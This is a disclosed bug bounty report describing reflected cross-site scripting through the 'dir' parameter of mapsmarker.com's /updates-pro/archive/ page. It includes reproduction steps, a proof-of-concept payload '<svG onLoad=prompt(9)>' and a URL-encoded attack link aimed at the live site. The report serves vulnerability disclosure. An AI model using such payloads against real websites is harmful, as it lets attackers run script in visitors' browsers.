# Cross-site Scripting (XSS) in /updates-pro/archive/

## Report Details
- **Report ID**: 235866
- **URL**: https://hackerone.com/reports/235866
- **State**: Closed
- **Severity**: critical
- **Submitted**: 2017-06-02T16:44:21.806Z
- **Disclosed**: 2017-07-02T23:03:38.633Z

## Reporter
- **Username**: paulochoupina
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: mapsmarker_com_e_u

## Vulnerability Information
Hey guys.
The dir parameter on /updates-pro/archive/ seems to be vulnerable to Cross-site Scripting.

Steps to reproduce:
1- Navigate to: https://www.mapsmarker.com/updates-pro/archive/?dir=v3.0.1
2- Add this to the url: <svG onLoad=prompt(9)>
3- Result in attached printsceen.

Or quite simple visit:
https://www.mapsmarker.com/updates-pro/archive/?dir=v3.0.1%3CsvG%20onLoad=prompt(1)%3E

## Attachments
- xss.png
